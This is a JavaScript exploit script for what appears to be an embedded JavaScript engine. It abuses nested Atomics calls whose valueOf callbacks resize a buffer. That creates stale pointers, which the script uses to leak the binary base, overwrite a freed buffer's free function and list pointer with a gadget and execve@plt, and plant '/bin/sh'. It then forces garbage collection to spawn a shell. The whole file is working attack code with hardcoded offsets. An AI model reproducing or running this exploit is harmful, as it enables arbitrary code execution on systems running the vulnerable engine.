// Nested Atomics exploit - using PLT directly
//
// The gadget does: call [rbx+0x18]
// This dereferences rbx+0x18 ONCE and calls the result
// So array_list.prev needs to BE the function address, not point to it
//
// We use execve@plt (0x11410) directly as the call target

function toU64(val) {
    if (val < 0n) val += (1n << 64n);
    return val;
}

function fromU64(val) {
    if (val >= (1n << 63n)) val -= (1n << 64n);
    return val;
}

var JS_ARRAY_BUFFER_FREE_OFF = 0x14bc0n;
var GADGET_OFF = 0xc5dd0n;
var EXECVE_PLT_OFF = 0x11410n;

// Phase 1: Leak binary base
var leakBuf = new ArrayBuffer(56, { maxByteLength: 16384 });
var leakView = new BigInt64Array(leakBuf);
var i;
for (i = 0; i < 7; i++) leakView[i] = 0n;

var leakDone = false;
var binary_base = toU64(Atomics.add(leakView, 6, {
    valueOf: function() {
        if (!leakDone) {
            leakDone = true;
            leakBuf.resize(16384);
            new ArrayBuffer(1024);
        }
        return 0n;
    }
})) - JS_ARRAY_BUFFER_FREE_OFF;

var gadget = binary_base + GADGET_OFF;
var execve_plt = binary_base + EXECVE_PLT_OFF;

// Phase 2: Create victims with nested Atomics corruption
var victims = [];
var j;

for (j = 0; j < 50; j++) {
    var buf = new ArrayBuffer(56, { maxByteLength: 16384 });
    var view = new BigInt64Array(buf);
    for (i = 0; i < 7; i++) view[i] = 0n;

    var outerDone = false;
    var innerDone = false;
    var victim = null;

    // Outer Atomics captures stale ptr X, will write to offset 48 (free_func)
    Atomics.exchange(view, 6, {
        valueOf: function() {
            if (!outerDone) {
                outerDone = true;

                // Inner Atomics ALSO captures stale ptr X
                // Will write to offset 24 (array_list.prev)
                Atomics.exchange(view, 3, {
                    valueOf: function() {
                        if (!innerDone) {
                            innerDone = true;
                            buf.resize(16384);
                            victim = new ArrayBuffer(1024);
                            var u = new Uint8Array(victim);
                            // Write "/bin/sh" at start of data
                            u[0] = 47; u[1] = 98; u[2] = 105; u[3] = 110;
                            u[4] = 47; u[5] = 115; u[6] = 104; u[7] = 0;
                        }
                        // Set array_list.prev = execve@plt address directly
                        return fromU64(execve_plt);
                    }
                });
            }
            // Set free_func = gadget
            return fromU64(gadget);
        }
    });

    if (victim) {
        victims.push(victim);
    }
}

// Phase 3: Trigger GC
victims = null;

for (i = 0; i < 100000; i++) {
    new ArrayBuffer(64);
}
